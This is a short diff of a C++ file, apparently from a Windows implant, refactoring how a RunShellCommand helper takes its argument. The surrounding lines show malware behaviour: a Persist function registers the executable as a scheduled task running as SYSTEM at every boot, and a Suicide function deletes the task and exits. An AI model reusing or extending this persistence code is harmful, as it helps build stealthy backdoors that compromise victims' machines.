@@ -1,4 +1,3 @@
-#include <iostream>
 #include <sstream>
 #include <boost/process.hpp>
 #include "machine.h"
@@ -23,7 +22,7 @@ void ReadStream(bp::ipstream& stream, std::string& output)
 	}
 }
 
-std::string Machine::RunShellCommand(std::string&& cmd)
+std::string Machine::RunShellCommand(std::string cmd)
 {
 	std::string output;
 	bp::ipstream out_stream, err_stream;
@@ -42,11 +41,11 @@ void Machine::Persist()
 
 	GetModuleFileNameA(nullptr, exe_path, buff_size);
 	cmd << "schtasks /Create /F /RU SYSTEM /SC ONSTART /TN " << quotify(TASK_NAME) << " /TR " << quotify(exe_path);
-	RunShellCommand(std::move(cmd.str()));
+	RunShellCommand(cmd.str());
 }
 
 void Machine::Suicide()
 {
-	RunShellCommand(std::move("schtasks /Delete /F /TN " + TASK_NAME));
+	RunShellCommand("schtasks /Delete /F /TN " + TASK_NAME);
 	std::exit(0);
 }
